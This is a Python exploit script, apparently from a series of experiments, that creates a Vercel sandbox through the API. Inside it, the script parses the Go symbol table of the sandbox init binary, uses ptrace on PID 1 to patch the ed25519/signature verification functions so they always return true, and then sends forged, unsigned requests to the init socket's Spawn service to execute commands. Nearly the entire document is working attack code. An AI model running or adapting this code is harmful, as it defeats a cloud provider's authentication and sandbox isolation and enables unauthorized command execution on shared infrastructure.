# 实验J57: pclntab 正确解析 (多 magic 候选验证) + patch ed25519.Verify
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj57"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, struct, subprocess, json, time, ctypes, base64

b = open("/run/vercel/share/sandbox-init", "rb").read()
print("binary size: %d" % len(b), flush=True)

def try_parse(pcln):
    try:
        magic = struct.unpack_from("<I", b, pcln)[0]
        if magic != 0xFFFFFFFB:
            return None
        pad = struct.unpack_from("<I", b, pcln+4)[0]
        minLC = b[pcln+8]
        ptrSize = b[pcln+9]
        nfunc, nfiles = struct.unpack_from("<II", b, pcln+10)
        if ptrSize not in (4, 8) or minLC == 0 or minLC > 8:
            return None
        if nfunc < 100 or nfunc > 500000:
            return None
        off = pcln + 18
        if ptrSize == 8:
            textStart = struct.unpack_from("<Q", b, off)[0]; off += 8
        else:
            textStart = struct.unpack_from("<I", b, off)[0]; off += 4
        fno, cuo, fto, pto, plo = struct.unpack_from("<IIIII", b, off)
        # 合理性: offset 递增, 都在二进制内
        offs = [pcln + x for x in (fno, cuo, fto, pto, plo)]
        if any(x > len(b) for x in offs):
            return None
        if not (offs[0] <= offs[1] <= offs[2] <= offs[3] <= offs[4]):
            return None
        return (ptrSize, nfunc, nfiles, textStart, fno, cuo, fto, pto, plo)
    except Exception:
        return None

cands = []
i = 0
while True:
    j = b.find(b"\xfb\xff\xff\xff", i)
    if j < 0:
        break
    r = try_parse(j)
    if r:
        cands.append((j, r))
    i = j + 1
print("valid pclntab candidates:", [(hex(j), r[0], r[1]) for j, r in cands], flush=True)
if not cands:
    raise SystemExit("no valid pclntab")

pcln, (ptrSize, nfunc, nfiles, textStart, fno, cuo, fto, pto, plo) = cands[-1]
print("using pclntab @ %s nfunc=%d textStart=%s" % (hex(pcln), nfunc, hex(textStart)), flush=True)

ftab = pcln + plo
funcnametab = pcln + fno
funcs = []
for j in range(nfunc):
    eoff = ftab + j * (ptrSize + 4)
    if eoff + ptrSize + 4 > len(b):
        break
    entry = struct.unpack_from("<Q" if ptrSize == 8 else "<I", b, eoff)[0]
    funcoff = struct.unpack_from("<I", b, eoff + ptrSize)[0]
    f = ftab + funcoff
    if f + ptrSize > len(b):
        continue
    nameoff = struct.unpack_from("<i", b, f + ptrSize)[0]
    nstart = funcnametab + nameoff
    if nstart < 0 or nstart >= len(b):
        continue
    nend = b.find(b"\x00", nstart)
    if nend < 0 or nend - nstart > 200:
        continue
    name = b[nstart:nend].decode("latin1", errors="replace")
    funcs.append((entry, name))
print("parsed funcs: %d" % len(funcs), flush=True)

targets = []
for entry, name in funcs:
    ln = name.lower()
    if "ed25519" in ln and "verify" in ln:
        targets.append((entry, name))
    elif "signature" in ln and ("verify" in ln or "check" in ln or "auth" in ln):
        targets.append((entry, name))
for entry, name in targets[:30]:
    print("TGT %s %s" % (hex(entry), name), flush=True)
if not targets:
    # 打印所有含 signature/verify 的函数帮助定位
    for entry, name in funcs:
        ln = name.lower()
        if "signature" in ln or "verify" in ln:
            print("FN %s %s" % (hex(entry), name), flush=True)

print("===== patch =====", flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_rw(addr, data=None, read_len=0):
    libc.ptrace(16, 1, None, None)
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        PTRACE_POKEDATA = 5
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    else:
        PTRACE_PEEKDATA = 4
        out = b""
        off = 0
        while off < read_len:
            v = libc.ptrace(PTRACE_PEEKDATA, 1, addr + off, None)
            if v == -1:
                break
            out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
            off += 8
        libc.ptrace(17, 1, None, None)
        return len(out), out

PATCH = b"\xb0\x01\xc3"  # mov al, 1; ret
patched = []
for entry, name in targets:
    if "WithOptions" in name:
        continue
    ok, total = ptrace_rw(entry, data=PATCH)
    print("PATCH %s %s: %d/%d" % (hex(entry), name, ok, total), flush=True)
    patched.append((entry, name))

print("===== test =====", flush=True)
def ccall(path, body, hdrs, timeout=10):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", body, "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return "EXC " + str(e)

ts = str(int(time.time() * 1000))
for label, hdrs in [
    ("random-sig", {"x-timestamp": ts, "x-signature": base64.b64encode(b"\x99" * 64).decode()}),
    ("no-sig", {}),
    ("garbage", {"x-timestamp": ts, "x-signature": "###"}),
]:
    out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", '{"command":"id"}', hdrs)
    print("[%s] %s" % (label, out[:800].replace("\r\n", " | ")), flush=True)
'''
run_cmd(sid, SCAN, "pclntab-fix-patch", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
